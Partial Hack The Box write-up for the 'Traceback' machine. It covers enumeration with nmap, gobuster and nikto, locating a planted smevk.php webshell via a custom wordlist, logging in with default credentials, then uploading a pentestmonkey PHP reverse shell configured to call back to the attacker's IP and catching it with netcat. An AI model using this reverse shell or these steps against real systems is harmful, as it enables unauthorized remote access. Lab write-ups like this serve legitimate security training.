## WORK IN PROGRESS

![traceback](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/Traceback/Screenshots/traceback.jpg)

## Enumeration
\
Start with a detailed nmap scan:


<div class="text-white bg-blue mb-2">
nmap -sC -sV -Pn -p- 10.10.10.181

Starting Nmap 7.70 ( https://nmap.org ) at 2020-03-14 16:57 EDT
Nmap scan report for 10.10.10.181
Host is up (0.047s latency).
Not shown: 65533 closed ports
PORT   STATE    SERVICE VERSION
22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp filtered http
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/$
Nmap done: 1 IP address (1 host up) scanned in 74.85 seconds
</div>


Lets check out the webserver in a browser:
```
http://10.10.10.181/
```
![webserver](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/Traceback/Screenshots/webserver.JPG)

The webserver landing page states there is a backdoor somewhere.  Let's enumerate further with gobuster:

```
gobuster -w /usr/share/wordlists/dirb/common.txt -t 30 -x html,asp,php -u http://10.10.10.181:80 -o gobuster_10.10.10.181_80.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.181:80/
[+] Threads      : 30
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : asp,php,html
[+] Timeout      : 10s
=====================================================
2020/03/14 17:00:26 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.asp (Status: 403)
/.hta (Status: 403)
/.hta.html (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.asp (Status: 403)
/.htpasswd.php (Status: 403)
/.hta.asp (Status: 403)
/.hta.php (Status: 403)
/index.html (Status: 200)
/index.html (Status: 200)
/server-status (Status: 403)
=====================================================
2020/03/14 17:00:54 Finished
=====================================================
```

Nothing Interesting here.  Lets try nikto:

```
nikto -h 10.10.10.181:80


- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.181
+ Target Hostname:    10.10.10.181
+ Target Port:        80
+ Start Time:         2020-03-14 17:01:06 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 459, size: 5911796d5b788, mtime: gzip
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST
+ OSVDB-3233: /icons/README: Apache default file found.
+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
+ Scan terminated:  17 error(s) and 7 item(s) reported on remote host
+ End Time:           2020-03-14 17:14:14 (GMT-4) (788 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Again nothing very interesting.  Lets dig into the landing page.  It looks like the page was created by someone with the handle Xh4H.  I did some googling and found the users Github page with a list of webshells he likes to use:

```
https://github.com/Xh4H/Web-Shells
```
![webshells](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/Traceback/Screenshots/webshells.JPG)

I then combined these into a wordlist to be used with gobuster:
```
root@an0nym0us3:~/HTB/Traceback# cat webshell_list 
alfa3.php
alfav3.0.1.php
andela.php
bloodsecv4.php
by.php
c99ud.php
cmd.php
configkillerionkros.php
jspshell.jsp
mini.php
obfuscated-punknopass.php
punk-nopass.php
punkholic.php
r57.php
smevk.php
wso2.8.5.php
```

Now run gobuster against the webserver using the new wordlist:
```
gobuster -w webshell_list -t 30 -x html,asp,php -u http://10.10.10.181:80 -o gobuster_10.10.10.181_80.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.181:80/
[+] Threads      : 30
        [+] Wordlist     : webshell_list
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : asp,php,html
[+] Timeout      : 10s
=====================================================
2020/03/15 22:31:33 Starting gobuster
=====================================================
/smevk.php (Status: 200)
=====================================================
2020/03/15 22:31:38 Finished
=====================================================
```

Looks like there is a page using one of the web shells.  Lets naviagte to it in the web browser:
```
http://10.10.10.181/smevk.php
```
![smevk](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/Traceback/Screenshots/smevk.JPG)

I tried the credentials admin:admin and was able to login:

![portal](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/Traceback/Screenshots/portal.JPG)

## Exploitation

Looks like we can upload a reverse php shell to this location.  


Lets upload the [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) from pentestmonkey to the webserver after we change the ip address and port to our attacking machine:

```
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.15.224';  // CHANGE THIS
$port = 12345;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

Now that our reverse shell is on the server, let set up a netcat listener to catch a reverse shell:

```
nc -nlvp 12345
```

Now execute the reverse shell using curl:
```
curl http://10.10.10.181/php-reverse-shell.php
```

And we get a reverse shell as the user webadmin:
```
root@an0nym0us3:~/HTB/Traceback# nc -nlvp 12345
listening on [any] 12345 ...
connect to [10.10.14.146] from (UNKNOWN) [10.10.10.181] 40458
Linux traceback 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 18:01:58 up 2 min,  0 users,  load average: 0.43, 0.24, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
/bin/sh: 0: can't access tty; job control turned off
```
First lets get an interactive bash shell:
```
$ bash -i
bash: cannot set terminal process group (521): Inappropriate ioctl for device
bash: no job control in this shell
webadmin@traceback:/$
```

Lets see what other users are on the machine:
```
webadmin@traceback:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root     root     4096 Aug 25  2019 .
drwxr-xr-x 22 root     root     4096 Aug 25  2019 ..
drwxr-x---  5 sysadmin sysadmin 4096 Mar 16 03:53 sysadmin
drwxr-x---  5 webadmin sysadmin 4096 Mar 16 18:03 webadmin
```

Ok now lets see what is our home directory:
```
webadmin@traceback:/home/webadmin$ ls -la
ls -la
total 48
drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 18:03 .
drwxr-xr-x 4 root     root     4096 Aug 25  2019 ..
-rw------- 1 webadmin webadmin  105 Mar 16 04:03 .bash_history
-rw-r--r-- 1 webadmin webadmin  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 webadmin webadmin 3771 Aug 23  2019 .bashrc
drwx------ 2 webadmin webadmin 4096 Aug 23  2019 .cache
drwxrwxr-x 3 webadmin webadmin 4096 Aug 24  2019 .local
-rw-rw-r-- 1 webadmin webadmin    1 Aug 25  2019 .luvit_history
-rw-r--r-- 1 webadmin webadmin  807 Aug 23  2019 .profile
drwxrwxr-x 2 webadmin webadmin 4096 Feb 27 06:29 .ssh
-rw-rw-r-- 1 sysadmin sysadmin  122 Mar 16 03:53 note.txt
```

No user.txt file.  Look at the note.txt:
```
cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```







